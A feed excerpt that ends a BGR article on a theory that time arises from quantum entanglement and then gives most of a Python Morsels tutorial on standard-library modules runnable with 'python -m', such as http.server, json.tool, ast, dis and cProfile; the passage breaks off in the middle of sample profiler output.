																	<p><a href="https://bgr.com/author/joshua-hawkins/"><img width="50" height="50" src="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82&amp;strip=all&amp;w=50" alt="" decoding="async" srcset="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82 250w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=150%2C150&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=100%2C100&amp;quality=82 100w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=42%2C42&amp;quality=82 42w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=96%2C96&amp;quality=82 96w" sizes="(max-width: 50px) 100vw, 50px"></a></p>
															</div>
															<div>
									
									<p><span>Published Jun 3rd, 2024 3:04PM EDT</span>
								</p></div>
													</div>

						
						
							<div>
								<p><img width="1020" height="574" src="https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?quality=82&amp;strip=all&amp;w=1020&amp;h=574&amp;crop=1" alt="quantum physics questions, universe" decoding="async" sizes="(min-width: 640px) 75vw, 100vw" fetchpriority="high" srcset="https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?quality=82 2400w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=150%2C84&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=300%2C169&amp;quality=82 300w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=768%2C432&amp;quality=82 768w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1024%2C576&amp;quality=82 1024w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1536%2C864&amp;quality=82 1536w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=2048%2C1152&amp;quality=82 2048w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=178%2C100&amp;quality=82 178w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=190%2C107&amp;quality=82 190w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=260%2C146&amp;quality=82 260w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=360%2C203&amp;quality=82 360w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=380%2C214&amp;quality=82 380w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=389%2C219&amp;quality=82 389w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=510%2C287&amp;quality=82 510w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=520%2C293&amp;quality=82 520w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=600%2C338&amp;quality=82 600w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=720%2C405&amp;quality=82 720w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=778%2C438&amp;quality=82 778w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=1020%2C574&amp;quality=82 1020w, https://bgr.com/wp-content/uploads/2023/01/AdobeStock_330287153.jpeg?resize=75%2C42&amp;quality=82 75w" title="definition of time">								</p>

								
																									<div>
																																<p><span>Image: Ulia Koltyrina / Adobe</span>
																			</p></div>
															</div>

						
						

												<div>

							<div>
								
<p>A new definition of time suggests that what we once thought was a fundamental element of our physical reality could actually just be an illusion created by quantum entanglement. That’s a very bold statement and one that certainly requires a little digging into to fully understand. So, let’s dig in.</p><p>To understand the core of this new theory, we need to understand a few things, including quantum entanglement. By its most basic definition, quantum entanglement is when two objects are so inextricably linked that when one is disturbed, the other is also disturbed, no matter how far apart they are. We also need to understand how time works in “general relativity.”

</p>
<p>General relativity says that time is baked into our universe, that our physical reality is set in space-time, and that time can warp and dilate in the presence of gravity; scientists believe we have seen <a href="https://bgr.com/science/our-galaxys-supermassive-black-hole-is-spinning-so-fast-its-warping-space-time/" target="_blank" rel="noreferrer noopener">the Milky Way’s black hole warp space-time</a> around it. However, quantum theory says that time isn’t bendable in any way. It does not change. Many physicists believe that the definition of time across both theories should be consistent. To prove this, Alessandro Coppo and other researchers went hunting for a new way to define time.

</p><figure><img decoding="async" loading="lazy" width="2400" height="1601" src="https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?quality=82&amp;strip=all" alt="old clock on pole" srcset="https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?quality=82 2400w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=150%2C100&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=300%2C200&amp;quality=82 300w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=768%2C512&amp;quality=82 768w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=1024%2C683&amp;quality=82 1024w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=1536%2C1025&amp;quality=82 1536w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=2048%2C1366&amp;quality=82 2048w, https://bgr.com/wp-content/uploads/2022/07/AdobeStock_510705760.jpeg?resize=63%2C42&amp;quality=82 63w" sizes="(max-width: 2400px) 100vw, 2400px"><span><span>Image source: Александр Бочкала / Adobe</span></span></figure><p>The suggestion here, at its core, seems to point to time being purely a consequence of entanglement. It states that the only reason that an object appears to change over time is because it is entangled with a clock. As such, anyone observing the universe externally would see it as completely static and unchanging.</p><div>	<h4>Tech. Entertainment. Science. Your inbox.</h4>	<p>Sign up for the most interesting tech &amp; entertainment news out there.</p>		<p>By signing up, I agree to the <a rel="noopener" href="https://pmc.com/terms-of-use/" target="_blank">Terms of Use</a> and have reviewed the <a rel="noopener" href="https://pmc.com/privacy-policy/" target="_blank">Privacy Notice.</a></p>	</div><p>It’s certainly an interesting new way to try to define time. While many physicists believe that the new definition of time is promising, there are still some details that need to be ironed out to really fully understand exactly what time is and whether or not it is truly a consequence of quantum entanglement. There’s also the matter of whether or not we can even test any of these ideas.</p><p>The researchers <a href="https://journals.aps.org/pra/abstract/10.1103/PhysRevA.109.052212" target="_blank" rel="noreferrer noopener">published their findings</a> in a paper featured in <em>Physical Review A</em>.</p>
							</div>

															<div>
	<h3>This article talks about:</h3>
					<p><span>
			<a href="https://bgr.com/tag/time/" rel="tag">
				TIME			</a>
		</span>
	</p></div>

								

								
<div>
		
		<div>
			<p><a href="https://bgr.com/author/joshua-hawkins/"><img width="56" height="56" src="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82&amp;strip=all&amp;w=56" alt="" decoding="async" srcset="https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?quality=82 250w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=150%2C150&amp;quality=82 150w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=100%2C100&amp;quality=82 100w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=42%2C42&amp;quality=82 42w, https://bgr.com/wp-content/uploads/2022/10/joshua-hawkins-avatar.jpg?resize=96%2C96&amp;quality=82 96w" sizes="(max-width: 56px) 100vw, 56px"></a></p>
		</div>

		<div>
			<p>Josh Hawkins has been writing for over a decade, covering science, gaming, and tech culture. He also is a top-rated product reviewer with experience in extensively researched product comparisons, headphones, and gaming devices.</p>
<p>Whenever he isn’t busy writing about tech or gadgets, he can usually be found enjoying a new world in a video game, or tinkering with something on his computer.</p>
		</div>

					
		
					
		
	</div>
													</div>

													
						
					</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Python's many command-line utilities (101 pts)]]></title>
            <link>https://www.pythonmorsels.com/cli-tools/</link>
            <guid>40567532</guid>
            <pubDate>Mon, 03 Jun 2024 21:03:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.pythonmorsels.com/cli-tools/">https://www.pythonmorsels.com/cli-tools/</a>, See on <a href="https://news.ycombinator.com/item?id=40567532">Hacker News</a></p>
<div id="readability-page-1" class="page"><div x-data="topic" x-init="trackVisibilityTime()">
<p>Did you know that some Python modules can double-up as handy command-line tools?</p>
<p>For example, you can run Python's <code>webbrowser</code> module from the command-line to open up a given URL in your default web browser:</p>
<div><pre><span></span><code>$ python -m webbrowser https://pym.dev/p
Opening <span>in</span> existing browser session.
</code></pre></div>
<p>The Python standard library includes many such <strong>module-script hybrids</strong>.</p>
<p>Below is a complete list of <strong>every module in Python that can be run as a command-line script</strong>.</p>
<p>Feel free to jump right to <a href="#cheat-sheet" target="_blank">the full list of all scripts in Python</a> at the end.</p>
<h2 id="how-m-works">How <code>-m</code> works</h2>
<p>Running Python with the <code>-m</code> command-line argument tells Python to run a given Python module as if it were a <a href="https://www.pythonmorsels.com/module-vs-script/" target="_blank">Python script</a>.</p>
<p>Some modules <em>do</em> something at import time.
For example <a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py" target="_blank">the <code>antigravity</code> module</a> will open up a web browser for an XKCD comic.
Running this module from the command-line would do the same thing as importing it:</p>

<p>This is called an "import side effect" and most modules avoid import side effects.
Fun Easter egg modules like <code>antigravity</code> and <code>this</code> are the exception.</p>
<p>Modules that avoid import side effects need a different mechanism to change their behavior when run as a command-line script or when imported as a module.
Python uses a <code>__name__</code> variable to distinguish between importing a module and running a module as a script.</p>
<p>When Python runs a module as a script, it sets the module's name to the string <code>"__main__"</code> (normally <code>__name__</code> would contain the module's <em>actual</em> name).
See more in <a href="https://www.pythonmorsels.com/making-main-function-python/" target="_blank">defining a main function in Python</a>.</p>
<p>For packages, Python also looks for a <code>__main__.py</code> file to run (there's one in <a href="https://github.com/python/cpython/blob/main/Lib/zipfile/__main__.py" target="_blank">the <code>zipfile</code> package</a> for example).</p>
<p>This distinction between module versus script allows for some really nifty command-line tools.</p>

<p>The first tools we'll look at are tools that I use even when I'm <em>not</em> working with Python code.</p>
<p>These are Python's most helpful general-purpose command-line tools.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m http.server</code></td>
<td>Start a simple web server</td>
<td><a href="https://www.pythonmorsels.com/http-server/" target="_blank">Video</a></td>
</tr>
<tr>
<td><code>python -m webbrowser</code></td>
<td>Launch your web browser</td>
<td><a href="https://docs.python.org/3/library/webbrowser.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m json.tool</code></td>
<td>Nicely format JSON data</td>
<td><a href="https://docs.python.org/3/library/json.html#module-json.tool" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m calendar</code></td>
<td>Show a command-line calendar</td>
<td><a href="https://docs.python.org/3/library/calendar.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="httpserver"><code>http.server</code></h3>
<p>Running the <code>http.server</code> module as a script will start a web server on port 8000 that hosts files from the current directory.
I use this <em>all the time</em> to preview Sphinx documentation sites (especially when using Sphinx's <code>dirhtml</code> option which is <em>all about</em> subdirectories of <code>index.html</code> files).</p>
<div><pre><span></span><code>$ python -m http.server
Serving HTTP on <span>0</span>.0.0.0 port <span>8000</span> <span>(</span>http://0.0.0.0:8000/<span>)</span> ...
</code></pre></div>
<h3 id="webbrowser"><code>webbrowser</code></h3>
<p>Running the <code>webbrowser</code> module as a script will open a given URL in your default web browser.
For example, this would open the page https://pseudorandom.name:</p>
<div><pre><span></span><code>$ python -m webbrowser pseudorandom.name
</code></pre></div>
<h3 id="jsontool"><code>json.tool</code></h3>
<p>Python's <code>json.tool</code> module can be run as a script to parse a JSON document and print out a version that's formatted nicely for human readability.</p>
<div><pre><span></span><code>$ python -m json.tool /home/trey/Downloads/download.json
<span>[</span>
    <span>{</span>
        <span>"title"</span>: <span>"Python's walrus operator"</span>,
        <span>"is_premium"</span>: false,
        <span>"url"</span>: <span>"/using-walrus-operator/"</span>
    <span>}</span>,
    <span>{</span>
        <span>"title"</span>: <span>"Refactoring long boolean expressions"</span>,
        <span>"is_premium"</span>: true,
        <span>"url"</span>: <span>"/refactoring-boolean-expressions/"</span>
    <span>}</span>
<span>]</span>
</code></pre></div>
<h3 id="calendar"><code>calendar</code></h3>
<p>Running the <code>calendar</code> module as a script will print a calendar of the current year by default.
It also accepts various arguments to customize its output.
Here's a calendar of just one month:</p>
<div><pre><span></span><code>$ python -m calendar <span>2024</span> <span>04</span>
     April <span>2024</span>
Mo Tu We Th Fr Sa Su
 <span>1</span>  <span>2</span>  <span>3</span>  <span>4</span>  <span>5</span>  <span>6</span>  <span>7</span>
 <span>8</span>  <span>9</span> <span>10</span> <span>11</span> <span>12</span> <span>13</span> <span>14</span>
<span>15</span> <span>16</span> <span>17</span> <span>18</span> <span>19</span> <span>20</span> <span>21</span>
<span>22</span> <span>23</span> <span>24</span> <span>25</span> <span>26</span> <span>27</span> <span>28</span>
<span>29</span> <span>30</span>
</code></pre></div>
<p>Those 4 scripts are general-purpose tools that I find helpful on <em>any</em> machine.
Python also includes a number of tools that are commonly available (or easily installable) on Linux and Mac machines.</p>
<h2 id="windows">Especially handy on Windows machines</h2>
<p>Running Python on Windows?
Or running Python on a Linux/Mac machine without the ability to easily install common command-line utilities like <code>uuid</code>, <code>sqlite3</code> and <code>gzip</code>?</p>
<p>These tools are all equivalent to command-line tools that are common on many Linux machines, though the equivalent Linux commands are usually more powerful and more user-friendly.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python3.12 -m uuid</code></td>
<td>Like <code>uuidgen</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/uuid.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python3.12 -m sqlite3</code></td>
<td>Like <code>sqlite3</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/sqlite3.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m zipfile</code></td>
<td>Like <code>zip</code> &amp; <code>unzip</code> CLI utilities</td>
<td><a href="https://docs.python.org/3/library/zipfile.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m gzip</code></td>
<td>Like <code>gzip</code> &amp; <code>gunzip</code> CLI utilities</td>
<td><a href="https://docs.python.org/3/library/gzip.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m tarfile</code></td>
<td>Like the <code>tar</code> CLI utility</td>
<td><a href="https://docs.python.org/3/library/tarfile.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m base64</code></td>
<td>Like the <code>base64</code> CLI utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m ftplib</code></td>
<td>Like the <code>ftp</code> utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m smtplib</code></td>
<td>Like the <code>sendmail</code> utility</td>
<td></td>
</tr>
<tr>
<td><code>python -m poplib</code></td>
<td>Like using <code>curl</code> to read email</td>
<td></td>
</tr>
<tr>
<td><code>python -m imaplib</code></td>
<td>Like using <code>curl</code> to read email</td>
<td></td>
</tr>
<tr>
<td><code>python -m telnetlib</code></td>
<td>Like the <code>telnet</code>utility</td>
<td></td>
</tr>
</tbody>
</table>
<p>Note that the command-line interfaces for <code>uuid</code> and <code>sqlite3</code> were both added in Python 3.12.</p>
<p>I've found the <code>sqlite3</code> module handy when in a Docker container that didn't have a <code>sqlite3</code> program installed, but <em>did</em> have Python 3.12.</p>
<h2 id="working-with-python-code">Working with Python code</h2>
<p>These tools are all handy when working with Python code.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m pip</code></td>
<td>Install third-party Python packages</td>
<td><a href="https://docs.python.org/3/installing/index.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m venv</code></td>
<td>Create a virtual environment</td>
<td><a href="https://docs.python.org/3/library/venv.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pdb</code></td>
<td>Run the Python Debugger</td>
<td><a href="https://docs.python.org/3/library/pdb.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m unittest</code></td>
<td>Run <code>unittest</code> tests in a directory</td>
<td><a href="https://docs.python.org/3/library/unittest.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pydoc</code></td>
<td>Show documentation for given string</td>
<td><a href="https://docs.python.org/3/library/pydoc.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m doctest</code></td>
<td>Run doctests for a given Python file</td>
<td><a href="https://docs.python.org/3/library/doctest.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m ensurepip</code></td>
<td>Install <code>pip</code> if it's not installed</td>
<td><a href="https://docs.python.org/3/library/ensurepip.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m idlelib</code></td>
<td>Launch Python's IDLE graphical REPL</td>
<td><a href="https://docs.python.org/3/library/idle.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m zipapp</code></td>
<td>Turn Python module into runnable ZIP</td>
<td><a href="https://docs.python.org/3/library/zipapp.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="pip"><code>pip</code></h3>
<p>The <code>pip</code> module can <a href="https://www.pythonmorsels.com/installing-python-packages/" target="_blank">installs third-party Python packages</a>.</p>
<h3 id="venv"><code>venv</code></h3>
<p>The <code>venv</code> module creates <a href="https://www.pythonmorsels.com/virtual-environments-in-python/" target="_blank">virtual environments</a>.</p>
<h3 id="pdb"><code>pdb</code></h3>
<p>The <code>pdb</code> module powers the Python debugger.
That's what the built-in <a href="https://www.pythonmorsels.com/debugging-with-breakpoint/" target="_blank"><code>breakpoint</code></a> function starts.
Running <code>pdb</code> as a command-line script will set a PDB breakpoint on the first line of your program.</p>
<h3 id="unittest"><code>unittest</code></h3>
<p>The <code>unittest</code> module can be used for writing automated tests in Python.
When running <code>unittest</code> as a command-line script will, all tests within the current directory will be identified and run automatically.</p>
<h3 id="pydoc"><code>pydoc</code></h3>
<p>Running the <code>pydoc</code> module as a command-line script will show the documentation for a given module or object.
This is the same documentation you would see if you passed the same object name to the built-in <code>help</code> function.</p>
<h3 id="doctest"><code>doctest</code></h3>
<p>Running <code>doctest</code> as a command-line script will evaluate all doctests (example code in <a href="https://www.pythonmorsels.com/docstrings/" target="_blank">docstrings</a>) within a given Python file.</p>
<h3 id="ensurepip"><code>ensurepip</code></h3>
<p>The <code>ensurepip</code> script is for folks who found that they've uninstalled <code>pip</code> and need a way to reinstall it (I did this once and it's not fun).</p>
<h3 id="idlelib"><code>idlelib</code></h3>
<p>Ever wondered how to launch Python's graphical IDLE tool from the command-line?
Run <code>python -m idlelib</code>.</p>
<h3 id="zipapp"><code>zipapp</code></h3>
<p>Want to bundle up a Python module into a ZIP file that <em>can be run directly by Python</em>?
Run <code>python -m zipapp my_module</code>.</p>
<h2 id="analyzing-python-code">Analyzing Python code</h2>
<p>Python also includes a handful of other Python-related tools that are specifically for analyzing Python code.</p>
<p>If you wanted to analyze some Python code to see how it ticks, these tools can be useful.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m tokenize</code></td>
<td>Break Python module into "tokens"</td>
<td><a href="https://docs.python.org/3/library/tokenize.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m ast</code></td>
<td>Show abstract syntax tree for code</td>
<td><a href="https://docs.python.org/3/library/ast.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m dis</code></td>
<td>Disassemble Python code to bytecode</td>
<td><a href="https://docs.python.org/3/library/dis.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m inspect</code></td>
<td>inspect source code of a Python object</td>
<td><a href="https://docs.python.org/3/library/inspect.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pyclbr</code></td>
<td>See overview of a module's objects</td>
<td></td>
</tr>
</tbody>
</table>
<p>You can think of the <code>tokenize</code>, <code>ast</code>, and <code>dis</code> modules as progressively deeper steps in the process of parsing the code in a Python module.</p>
<h3 id="tokenize"><code>tokenize</code></h3>
<p>The <code>tokenize</code> module/script will break a Python file into a tree of "tokens":</p>
<div><pre><span></span><code>$ python -m tokenize hello.py
<span>0</span>,0-0,0:      ENCODING     <span>'utf-8'</span>
<span>1</span>,0-1,5:      NAME         <span>'print'</span>
<span>1</span>,5-1,6:      OP           <span>'('</span>
<span>1</span>,6-1,19:     STRING       <span>'"Hello world"'</span>
<span>1</span>,19-1,20:    OP           <span>')'</span>
<span>1</span>,20-1,21:    NEWLINE      <span>'\n'</span>
<span>2</span>,0-2,0:      ENDMARKER    <span>''</span>
</code></pre></div>
<h3 id="ast"><code>ast</code></h3>
<p>The <code>ast</code> module/script goes one step further, turning the tokens into an "abstract syntax tree":</p>
<div><pre><span></span><code>$ python -m ast hello.py
Module<span>(</span>
   <span>body</span><span>=[</span>
      Expr<span>(</span>
         <span>value</span><span>=</span>Call<span>(</span>
            <span>func</span><span>=</span>Name<span>(</span><span>id</span><span>=</span><span>'print'</span>, <span>ctx</span><span>=</span>Load<span>())</span>,
            <span>args</span><span>=[</span>
               Constant<span>(</span><span>value</span><span>=</span><span>'Hello world'</span><span>)]</span>,
            <span>keywords</span><span>=[]))]</span>,
   <span>type_ignores</span><span>=[])</span>
</code></pre></div>
<h3 id="dis"><code>dis</code></h3>
<p>The <code>dis</code> module/script disassembles the abstract syntax tree into Python's "bytecode":</p>
<div><pre><span></span><code>$ python -m dis hello.py
  <span>0</span>     <span>0</span> RESUME             <span>0</span>

  <span>1</span>     <span>2</span> PUSH_NULL
        <span>4</span> LOAD_NAME          <span>0</span> <span>(</span>print<span>)</span>
        <span>6</span> LOAD_CONST         <span>0</span> <span>(</span><span>'Hello world'</span><span>)</span>
        <span>8</span> CALL               <span>1</span>
       <span>16</span> POP_TOP
       <span>18</span> RETURN_CONST       <span>1</span> <span>(</span>None<span>)</span>
</code></pre></div>
<p>I've used <code>tokenize</code> to see how Python initially parses a module.
I used the <code>ast</code> module along to create the <a href="https://github.com/treyhunner/undataclass" target="_blank">undataclass</a> tool, along with the <code>ast</code> script which helped me figure out how Python was parsing my file.
I've used the <code>dis</code> module to try confirming a claim like "comprehensions generate fewer operations than loops".</p>
<h3 id="inspect"><code>inspect</code></h3>
<p>The <code>inspect</code> module can be used as a script to inspect the source code of a given Python object.</p>
<div><pre><span></span><code>$ python -m inspect contextlib:redirect_stdout
class redirect_stdout<span>(</span>_RedirectStream<span>)</span>:
    <span>"""Context manager for temporarily redirecting stdout to another file.</span>

<span>        # How to send help() to stderr</span>
<span>        with redirect_stdout(sys.stderr):</span>
<span>            help(dir)</span>

<span>        # How to write help() to a file</span>
<span>        with open('help.txt', 'w') as f:</span>
<span>            with redirect_stdout(f):</span>
<span>                help(pow)</span>
<span>    """</span>

    <span>_stream</span> <span>=</span> <span>"stdout"</span>
</code></pre></div>
<p>Unfortunately, it only works on objects that are implemented in Python directly.</p>
<div><pre><span></span><code>$ python -m inspect itertools:zip_longest
Can<span>'</span>t get info <span>for</span> <span>builtin</span> modules.
</code></pre></div>
<p>Using the <code>inspect</code> module as a script seems helpful in theory, but I always find myself reaching for the actual code files instead.
This may be because it's often helpful to see a bit more context than just the code for an one object: seeing inherited classes, global module state, other functions/classes, and imports are often helpful.</p>
<h3 id="pyclbr"><code>pyclbr</code></h3>
<p>The <code>pyclbr</code> module can be run as a script to get a quick overview of each class, method, and function in a specific Python module:</p>
<div><pre><span></span><code>$ python -m pyclbr timeit
def reindent <span>81</span>
class Timer <span>[]</span> <span>86</span>
  def __init__ <span>104</span>
  def print_exc <span>139</span>
  def timeit <span>166</span>
  def repeat <span>186</span>
  def autorange <span>212</span>
def timeit <span>234</span>
def repeat <span>240</span>
def main <span>246</span>
  def callback <span>324</span>
  def format_time <span>344</span>
</code></pre></div>
<p>That somewhat obfuscated <code>pyclbr</code> name stands for "Python class browser" (it was originally meant just for browsing classes and methods).</p>
<h2 id="just-for-fun">Just for fun</h2>
<p>These are Python Easter Eggs that work as Python scripts.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m __hello__</code></td>
<td>Print <code>Hello world!</code></td>
</tr>
<tr>
<td><code>python -m this</code></td>
<td>Display the Zen of Python (PEP 20)</td>
</tr>
<tr>
<td><code>python -m antigravity</code></td>
<td>Open XKCD 353 in a web browser</td>
</tr>
<tr>
<td><code>python -m turtledemo</code></td>
<td>See <code>turtle</code> module demos</td>
</tr>
</tbody>
</table>
<h3 id="__hello__"><code>__hello__</code></h3>
<p>Want to implement "hello world" in Python?
It's already implemented in the <code>__hello__</code> module!</p>
<div><pre><span></span><code>$ python -m __hello__
Hello world!
</code></pre></div>
<h3 id="this"><code>this</code></h3>
<p>Want to see the Zen of Python printed out in your terminal?
Either <code>import this</code> or run <code>this</code> as a script:</p>
<div><pre><span></span><code>$ python -m this
The Zen of Python, by Tim Peters

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren<span>'t special enough to break the rules.</span>
<span>Although practicality beats purity.</span>
<span>Errors should never pass silently.</span>
<span>Unless explicitly silenced.</span>
<span>In the face of ambiguity, refuse the temptation to guess.</span>
<span>There should be one-- and preferably only one --obvious way to do it.</span>
<span>Although that way may not be obvious at first unless you'</span>re Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it<span>'s a bad idea.</span>
<span>If the implementation is easy to explain, it may be a good idea.</span>
<span>Namespaces are one honking great idea -- let'</span>s <span>do</span> more of those!
</code></pre></div>
<h3 id="antigravity"><code>antigravity</code></h3>
<p>Importing the <code>antigravity</code> module in Python will open <a href="https://xkcd.com/353/" target="_blank">an XKCD comic on Python</a> in your web browser (<a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py" target="_blank">powered</a> by the <code>webbrowser</code> module mentioned above).
Running <code>antigravity</code> as a script works too:</p>

<h3 id="turtledemo"><code>turtledemo</code></h3>
<p>If you want to see a demo of different drawings you can make with Python's <code>turtle</code> module, run <code>turtledemo</code> as a script:</p>


<p>Here are a number of other slightly advanced Python-related tools.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m asyncio</code></td>
<td>Launch an asyncio-aware Python REPL</td>
<td><a href="https://docs.python.org/3/library/asyncio.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m cProfile</code></td>
<td>Profile a Python program</td>
<td><a href="https://docs.python.org/3/library/profile.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m profile</code></td>
<td>Profile Python program with pure Python</td>
<td></td>
</tr>
<tr>
<td><code>python -m pstats</code></td>
<td>Show stats for profile/cProfile-generated file</td>
<td></td>
</tr>
<tr>
<td><code>python -m pickle</code></td>
<td>Display contents of a pickle file (high-level)</td>
<td><a href="https://docs.python.org/3/library/pickle.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pickletools</code></td>
<td>Disassemble a pickle file (low-level)</td>
<td><a href="https://docs.python.org/3/library/pickletools.html" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="asyncio"><code>asyncio</code></h3>
<p>If you find yourself working with <code>async</code>/<code>await</code> often in Python, you may find the asynchronous REPL handy.</p>
<div><pre><span></span><code>$ python -m asyncio
asyncio REPL <span>3</span>.12.0 <span>(</span>main, Nov <span>30</span> <span>2023</span>, <span>17</span>:49:51<span>)</span> <span>[</span>GCC <span>11</span>.4.0<span>]</span> on linux
Use <span>"await"</span> directly instead of <span>"asyncio.run()"</span>.
Type <span>"help"</span>, <span>"copyright"</span>, <span>"credits"</span> or <span>"license"</span> <span>for</span> more information.
&gt;&gt;&gt; import asyncio
&gt;&gt;&gt; await asyncio.sleep<span>(</span><span>1</span>, <span>result</span><span>=</span><span>'hello'</span><span>)</span>
<span>'hello'</span>
</code></pre></div>
<h3 id="profile"><code>cProfile</code> &amp; <code>pstats</code></h3>
<p>The <code>cProfile</code> script will profile your code by noting how long your code spent on various operations and within various functions.</p>
<div><pre><span></span><code>$ python -m cProfile -s tottime -m http.server <span>8000</span>
Serving HTTP on <span>0</span>.0.0.0 port <span>8000</span> <span>(</span>http://0.0.0.0:8000/<span>)</span> ...
^C
Keyboard interrupt received, exiting.
         <span>41242</span> <span>function</span> calls <span>(</span><span>40547</span> primitive calls<span>)</span> <span>in</span> <span>1</span>.111 seconds

   Ordered by: internal <span>time</span>

   ncalls  tottime  percall  cumtime  percall filename:lineno<span>(</span><span>function</span><span>)</span>
        <span>3</span>    <span>1</span>.075    <span>0</span>.358    <span>1</span>.075    <span>0</span>.358 <span>{</span>method <span>'poll'</span> of <span>'select.poll'</span> objects<span>}</span>
